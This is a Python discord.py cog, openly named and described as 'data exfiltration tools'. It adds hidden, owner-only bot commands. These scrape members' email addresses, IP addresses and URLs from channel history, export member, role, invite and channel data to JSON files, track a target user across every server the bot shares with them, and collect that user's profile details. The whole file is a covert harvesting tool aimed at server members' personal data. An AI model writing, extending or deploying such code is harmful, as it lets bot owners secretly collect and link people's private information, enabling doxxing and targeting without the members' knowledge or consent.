import discord
from discord.ext import commands
import asyncio
import json
import os
import aiohttp
import re

EXFIL_DIR = "data/exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

class Exfil(commands.Cog, name="exfil"):
    """21-30: data exfiltration tools."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabemails(self, ctx: commands.Context):
        """21. search message history for email addresses."""
        pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    emails = re.findall(pattern, msg.content)
                    for e in emails:
                        found.append(f"{msg.author}: {e}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no emails found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def grabips(self, ctx: commands.Context):
        """22. search for ip addresses in chat history."""
        pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    ips = re.findall(pattern, msg.content)
                    for ip in ips:
                        found.append(f"{msg.author}: {ip}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no ips found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def graburls(self, ctx: commands.Context):
        """23. extract all urls from recent message history."""
        pattern = r"https?://[^\s]+"
        found = []
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(limit=200):
                    urls = re.findall(pattern, msg.content)
                    for u in urls:
                        found.append(f"{msg.author}: {u}")
            except:
                continue
        await ctx.send("\n".join(found[:50]) or "no urls found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilmembers(self, ctx: commands.Context):
        """24. export full member data to json."""
        data = []
        for member in ctx.guild.members:
            data.append({
                "id": member.id,
                "name": str(member),
                "display_name": member.display_name,
                "joined_at": str(member.joined_at),
                "created_at": str(member.created_at),
                "roles": [r.name for r in member.roles],
                "bot": member.bot,
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_members.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} members.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilroles(self, ctx: commands.Context):
        """25. export all role configurations."""
        data = []
        for role in ctx.guild.roles:
            data.append({
                "id": role.id,
                "name": role.name,
                "permissions": role.permissions.value,
                "color": role.color.value,
                "position": role.position,
                "members": len(role.members),
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_roles.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} roles.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilinvites(self, ctx: commands.Context):
        """26. export all server invites."""
        try:
            invites = await ctx.guild.invites()
            data = [{"code": i.code, "uses": i.uses, "max_uses": i.max_uses, "channel": i.channel.name, "inviter": str(i.inviter)} for i in invites]
            filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_invites.json")
            with open(filepath, "w") as f:
                json.dump(data, f, indent=4)
            await ctx.send(f"exported {len(data)} invites.", file=discord.File(filepath))
        except:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def exfilchannels(self, ctx: commands.Context):
        """27. export channel structure."""
        data = []
        for ch in ctx.guild.channels:
            data.append({
                "id": ch.id,
                "name": ch.name,
                "type": str(ch.type),
                "category": ch.category.name if ch.category else None,
                "position": ch.position,
            })
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_channels.json")
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        await ctx.send(f"exported {len(data)} channels.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dmscan(self, ctx: commands.Context, target: discord.Member):
        """28. scan mutual guilds with a target user."""
        mutuals = []
        for guild in self.bot.guilds:
            if guild.get_member(target.id):
                mutuals.append(f"{guild.name} ({guild.id})")
        await ctx.send(f"mutual guilds with {target}: {len(mutuals)}\n```\n" + "\n".join(mutuals[:20]) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def snapshot(self, ctx: commands.Context):
        """29. take a full server snapshot including all data."""
        results = {
            "guild": {"name": ctx.guild.name, "id": ctx.guild.id},
            "members": [],
            "roles": [],
            "channels": [],
        }
        for m in ctx.guild.members:
            results["members"].append({"name": str(m), "id": m.id, "roles": [r.name for r in m.roles]})
        for r in ctx.guild.roles:
            results["roles"].append({"name": r.name, "id": r.id, "perms": r.permissions.value})
        for c in ctx.guild.channels:
            results["channels"].append({"name": c.name, "id": c.id, "type": str(c.type)})
        filepath = os.path.join(EXFIL_DIR, f"{ctx.guild.id}_snapshot.json")
        with open(filepath, "w") as f:
            json.dump(results, f, indent=4)
        await ctx.send("full snapshot saved.", file=discord.File(filepath))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def linktree(self, ctx: commands.Context, target: discord.Member = None):
        """30. gather all connected accounts of a user."""
        target = target or ctx.author
        info = []
        try:
            profile = await self.bot.fetch_user(target.id)
            if profile.banner:
                info.append(f"banner: {profile.banner.url}")
            if profile.accent_color:
                info.append(f"accent color: {profile.accent_color}")
        except:
            pass
        info.append(f"avatar: {target.display_avatar.url}")
        await ctx.send("\n".join(info) or "no additional data.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Exfil(bot))
